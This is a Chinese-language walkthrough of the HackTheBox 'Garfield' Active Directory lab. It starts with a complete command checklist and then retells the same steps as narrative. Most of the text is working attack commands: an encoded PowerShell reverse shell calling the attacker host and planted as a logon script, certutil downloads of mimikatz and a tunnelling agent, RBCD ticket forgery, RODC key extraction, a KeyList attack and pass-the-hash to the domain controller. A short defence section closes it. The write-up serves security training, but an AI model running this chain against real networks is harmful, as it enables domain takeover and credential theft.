# 完整核心命令清单

## 环境信息

| 参数 | 值 |
| :--- | :--- |
| 目标主机 | `10.129.228.168` |
| Kali 主机 | `10.10.16.46` |
| 域名 | `garfield.htb` |
| 初始凭据 | `j.arbuckle` / `Th1sD4mnC4t!@1978` |

## 核心渗透步骤与命令清单

### Phase 1: 信息收集与初始立足

1.  域名解析
    ```bash
    echo "10.129.228.168 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
    ```
2.  端口与服务扫描
    ```bash
    nmap -sC -sV 10.129.228.168
    ```
3.  凭据验证与共享枚举
    ```bash
    crackmapexec smb 10.129.228.168 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb
    smbmap -H 10.129.228.168 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb
    ```

### Phase 2: 登录脚本劫持 (Initial Access)

1.  生成 Base64 编码的 PowerShell 反弹 Shell
    ```bash
    CMD='$client = New-Object System.Net.Sockets.TCPClient("10.10.16.46",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    ENC=$(echo -n $CMD | iconv -f ASCII -t UTF-16LE | base64 -w 0)
    cat > printerDetect.bat << EOF
    @echo off
    powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC
    EOF
    ```
2.  上传恶意脚本至 `SYSVOL`
    ```bash
    smbclient //10.129.228.168/SYSVOL -U j.arbuckle%'Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
    ```
3.  修改 AD 属性指向恶意脚本
    ```bash
    bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.228.168 set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
    ```
4.  监听获取 `l.wilson` Shell
    ```bash
    nc -lvnp 4444
    ```

### Phase 3: 横向移动 (Lateral Movement)

1.  在 `l.wilson` Shell 中重置 `l.wilson_adm` 密码
    ```powershell
    Set-ADAccountPassword -Identity l.wilson_adm -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
    ```
2.  切换至 Kali 登录 `l.wilson_adm`
    ```bash
    evil-winrm -i 10.129.228.168 -u l.wilson_adm -p 'WhoKnows123!'
    type C:\Users\l.wilson_adm\Desktop\user.txt
    ```

### Phase 4: 权限提升与内网穿透 (PrivEsc & Pivot)

1.  在 `l.wilson_adm` WinRM 中将自己加入 `RODC` 管理员组
    ```powershell
    Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
    ```
2.  Kali 启动 Ligolo-ng 代理
    ```bash
    ./proxy -selfcert -laddr 0.0.0.0:11601
    # 交互界面执行: session 1 -> start
    # 新终端添加路由
    sudo ip route add 192.168.100.0/24 dev ligolo
    ```
3.  在 WinRM 上传并运行 Agent
    ```powershell
    certutil -urlcache -split -f http://10.10.16.46:8000/agent.exe agent.exe
    .\agent.exe -connect 10.10.16.46:11601 -ignore-cert
    ```

### Phase 5: RBCD 攻击获取 RODC01 SYSTEM

1.  Kali 创建伪造计算机账户
    ```bash
    addcomputer.py garfield.htb/l.wilson_adm:'WhoKnows123!' -computer-name 'FAKE' -computer-pass 'FakePass123!' -dc-ip 10.129.228.168
    ```
2.  WinRM 配置 RBCD
    ```powershell
    Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount "CN=FAKE,CN=Computers,DC=garfield,DC=htb"
    ```
3.  Kali 伪造票据并获取 RODC01 SYSTEM
    ```bash
    getST.py garfield.htb/'FAKE':'FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.228.168
    export KRB5CCNAME=$(ls -t *.ccache | head -1)
    psexec.py -k -no-pass -dc-ip 10.129.228.168 -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
    ```

### Phase 6: 提取 RODC 密钥与 KeyList 攻击

1.  在 RODC01 SYSTEM Shell 中提取密钥
    ```cmd
    certutil -urlcache -split -f http://10.10.16.46:8000/mimikatz.exe mimikatz.exe
    .\mimikatz.exe
    # mimikatz 内执行:
    privilege::debug
    lsadump::lsa /inject /name:krbtgt_8245
    # 记录 AES256 Key: d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
    ```
2.  修复 RODC 密码复制策略 (在 `l.wilson_adm` WinRM 执行)
    ```powershell
    Set-ADComputer RODC01 -Clear msDS-NeverRevealGroup
    Set-ADComputer RODC01 -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}
    ```
3.  在 RODC01 SYSTEM Shell 伪造 Golden Ticket 并发起 KeyList 攻击
    ```cmd
    .\Rubeus_v233.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /flags:forwardable,renewable,enc_pa_rep /outfile:ticket8245.kirbi

    .\Rubeus_v233.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:ticket8245.kirbi /nowrap
    # 提取输出中的 Password Hash: EE238F6DEBC752010428F20875B092D5
    ```

### Phase 7: 域控接管 (Domain Admin)

```bash
evil-winrm -i 10.129.228.168 -u Administrator -H 'EE238F6DEBC752010428F20875B092D5'
type C:\Users\Administrator\Desktop\root.txt
```

---

# 硬核实战 | 从普通域用户到完整域控接管：HTB Garfield 深度拆解

> **摘要**：本文完整复盘 HackTheBox 高难度 Windows AD 靶机 `Garfield` 的渗透路径。涵盖 `scriptPath` 劫持、Ligolo-ng 内网穿透、RBCD 委派滥用、RODC 密钥提取以及高阶 `KeyList Attack` 绕过主域控认证限制。无废话，全干货，附完整命令与防御建议。

## 0x00 靶机概况

| 项目 | 说明 |
| :--- | :--- |
| **难度** | Hard |
| **架构** | Windows Server 2019 AD 域环境 |
| **核心组件** | 主域控 `DC01` (10.129.x.x) \| 只读域控 `RODC01` (192.168.100.2) |
| **初始入口** | 已知凭据 `j.arbuckle` / `Th1sD4mnC4t!@1978` |

## 0x01 信息收集与初始立足

目标开放标准 AD 端口（53, 88, 389, 445, 5985, 3389）。通过 SMB 枚举发现 `j.arbuckle` 对 `SYSVOL` 共享具备读取权限，且通过 `bloodyAD` 枚举发现其对 `l.wilson` 用户的 `scriptPath` 属性拥有 `WRITE` 权限。

**关键命令：**
```bash
crackmapexec smb 10.129.228.168 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.228.168 get writable --otype USER --detail
```

## 0x02 登录脚本劫持 (ScriptPath Abuse)

<mark>`scriptPath` 是 AD 用户对象的标准属性，指向用户登录时自动执行的脚本路径。</mark>由于 `j.arbuckle` 拥有修改权限，我们将恶意 Payload 上传至 `SYSVOL/garfield.htb/scripts/`，并将 `l.wilson` 的 `scriptPath` 指向该文件。

**Payload 构造 (Base64 防拦截)：**
```bash
CMD='$client = New-Object System.Net.Sockets.TCPClient("10.10.16.46",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
ENC=$(echo -n $CMD | iconv -f ASCII -t UTF-16LE | base64 -w 0)
cat > printerDetect.bat << EOF
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC
EOF
```

**上传与属性修改：**
```bash
smbclient //10.129.228.168/SYSVOL -U j.arbuckle%'Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.228.168 set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
```
等待后台计划任务或交互式登录触发，成功获取 `l.wilson` Shell。

## 0x03 横向移动与权限跃迁

利用 `l.wilson` 的 AD 模块权限，直接重置高权限账户 `l.wilson_adm` 的密码，并通过 WinRM 接管。
```powershell
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
```
切换至 `l.wilson_adm` 后，发现其属于 `RODC Administrators` 组，具备管理只读域控的权限。

## 0x04 隧道穿透与 RBCD 提权

`RODC01` 位于内网 `192.168.100.0/24`，使用 `Ligolo-ng` 建立稳定隧道。随后利用 `MachineAccountQuota=10` 创建伪造计算机账户 `FAKE`，并配置 **基于资源的约束委派 (RBCD)**。

```bash
# Kali 创建机器账户
addcomputer.py garfield.htb/l.wilson_adm:'WhoKnows123!' -computer-name 'FAKE' -computer-pass 'FakePass123!' -dc-ip 10.129.228.168
```
```powershell
# WinRM 配置委派
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount "CN=FAKE,CN=Computers,DC=garfield,DC=htb"
```
通过 `getST.py` 伪造票据，利用 `psexec.py` 成功获取 `RODC01` 的 `NT AUTHORITY\SYSTEM` 权限。

## 0x05 RODC 密钥提取与 KeyList 攻击 (核心难点)

在 RODC01 上运行 Mimikatz 提取 RODC 专属 KDC 账户 `krbtgt_8245` 的 AES256 密钥。
```cmd
lsadump::lsa /inject /name:krbtgt_8245
# 获取 AES256: d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

⚠️ **关键踩坑：`KDC_ERR_TGT_REVOKED`**
直接使用 RODC 密钥伪造 Golden Ticket 请求主域控 TGS 会被拒绝，因为 `Administrator` 默认位于 `Denied RODC Password Replication Group`。必须清空拒绝列表并添加允许列表：
```powershell
Set-ADComputer RODC01 -Clear msDS-NeverRevealGroup
Set-ADComputer RODC01 -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}
```

策略生效后，使用 Rubeus v2.3.3+ 发起 **KeyList Attack**：
```cmd
.\Rubeus_v233.exe golden /rodcNumber:8245 /aes256:<AES256_KEY> /user:Administrator /id:500 /domain:garfield.htb /sid:<DOMAIN_SID> /flags:forwardable,renewable,enc_pa_rep /outfile:ticket8245.kirbi
.\Rubeus_v233.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:ticket8245.kirbi /nowrap
```
成功获取域管 NTLM Hash：`EE238F6DEBC752010428F20875B092D5`。

## 0x06 域控接管

使用 Pass-the-Hash 直连 DC01，读取 `root.txt`，完成完整控制。
```bash
evil-winrm -i 10.129.228.168 -u Administrator -H 'EE238F6DEBC752010428F20875B092D5'
type C:\Users\Administrator\Desktop\root.txt
```

## 蓝队防御建议

1.  **严格管控 AD 属性写权限**：监控 `scriptPath`、`userParameters` 等属性的修改（Event ID 5136）。
2.  **RODC 复制策略硬化**：确保高权限账户（Domain Admins 等）严格位于 `Denied RODC Password Replication Group`，且禁止普通 IT 支持组修改 `msDS-NeverRevealGroup`。
3.  **监控 RBCD 变更**：重点告警 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的异常写入。
4.  **网络微隔离**：RODC 通常部署于分支隔离网段，应限制核心网络到 RODC 网段的双向流量，阻断 Ligolo/Chisel 等隧道工具。

> 💡 **红队思考**：漏洞利用只是起点，权限的横向与纵向延伸才是核心。AD 环境中的“配置错误”往往比“代码漏洞”更致命。保持敬畏，持续迭代。

*(本文仅用于